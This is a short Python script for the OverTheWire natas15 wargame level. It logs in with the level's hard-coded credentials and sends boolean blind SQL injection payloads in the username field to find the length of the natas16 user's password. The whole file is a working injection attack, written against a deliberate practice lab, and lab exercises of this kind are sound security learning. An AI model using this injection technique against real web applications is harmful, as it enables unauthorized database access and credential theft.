import requests

url = "http://natas15.natas.labs.overthewire.org"
login = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
inject = """ " or ((select char_length(password) from users where username = "natas16") > 2) or "1"="2"""
i = 0

while True:
    session = requests.Session()

    data = f""" " or ((select char_length(password) from users where username = "natas16") = {i}) or "1"="2"""
    # print(data)

    r1 = session.get(url, auth=login)
    r2 = session.post(f"{url}?debug=1", data={'username': data}, auth=login)
    # print(r2.text)
    if "This user exists." in r2.text:
        print(f"Querty match found, password is of length {i}")
    i+=1
    session.close()
